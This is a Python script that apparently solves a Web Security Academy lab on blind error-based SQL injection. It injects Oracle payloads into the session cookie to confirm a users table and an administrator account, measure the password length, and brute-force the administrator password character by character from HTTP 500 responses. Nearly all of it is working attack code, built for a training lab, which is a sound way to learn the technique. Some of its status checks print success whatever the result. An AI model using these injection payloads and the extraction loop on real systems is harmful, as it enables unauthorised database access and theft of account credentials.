from bs4 import BeautifulSoup
import requests

# LAB12 Blind SQLi Error-messsage
# Author: AFANX
# 09/08/2024

def info(msg):
    print("[!] " + str(msg))

def error(msg):
    print("[-] " + str(msg))

def success(msg):
    print("[+] " + str(msg))

def send(payload, cookie=None):
    info(payload)
    if(cookie is None):
        response = requests.get(payload)
        info(response.status_code)
        return response
    else:
        cookies = {}
        cookies[cookie.split(":")[0]] = cookie.split(":")[1]
        response = requests.get(payload, cookies=cookies)
        info(response.status_code)
        return response

def recv_code(url, cookie=None):
    if(cookie is None):
        response = requests.get(url)
        return response.status_code
    else:
        cookies = {}
        cookies[cookie.split(":")[0]] = cookie.split(":")[1]
        response = requests.get(url, cookies=cookies)
        return response.status_code

def recv_cookies(url, domain):
    info(url)
    response = requests.get(url)
    cookie_dict = response.cookies.get_dict(domain=domain)
    found = ['%s=%s' % (name, value) for (name, value) in cookie_dict.items()]
    return ':'.join(found[0].split("="))

def url_encode(str_payload):
    url_encode_result = "+"
    for i in str_payload.split(" "):
        url_encode_result += i + '+'
    return url_encode_result[:len(url_encode_result)-1]

def main():
    url = "https://0a51001b043ed718851fe965004a00d7.web-security-academy.net/"

    cookies = recv_cookies(url, "0a51001b043ed718851fe965004a00d7.web-security-academy.net")
    info("COOKIES: " + cookies)

    # step 0 -> check blind sqli
    payload = cookies + "'"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('h4'):
        if('Internal Server Error' in i.text):
            success("Blind SQLi Error-based")
            break
    
    # step 1 - > check user table
    payload = cookies + "'||(SELECT '' FROM users WHERE ROWNUM=1)||'"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('h4'):
        if('Internal Server Error' in i.text):
            error("bad sql-request")
            break
    success("Good request")
    
    # step 2 -> check user administrator
    payload = cookies + "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('h4'):
        if('Internal Server Error' in i.text):
            success("find administrator")
            break

    # step 3 -> lenght
    payload = cookies + "'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('h4'):
        if('Internal Server Error' in i.text):
            error("bad lenght")
            break
    success("find lenght")

    # step 4 -> bruteforce password
    wordlist = ['0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    count = 1
    flag = 0
    password = ""

    while(count != 21):
        for k in wordlist:
            payload = cookies + "'||(SELECT CASE WHEN SUBSTR(password," + str(count) + ",1) = '" + k + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            response_code = recv_code(url, payload)
            info(response_code)
            info(payload)
            
            if(response_code == 500):
                password += k
                flag = 1
                success("PASSWORD: " + password)

            if(flag == 1):
                flag = 0
                count += 1
                break

    success("administrator:" + password)

if __name__ == "__main__":
    main()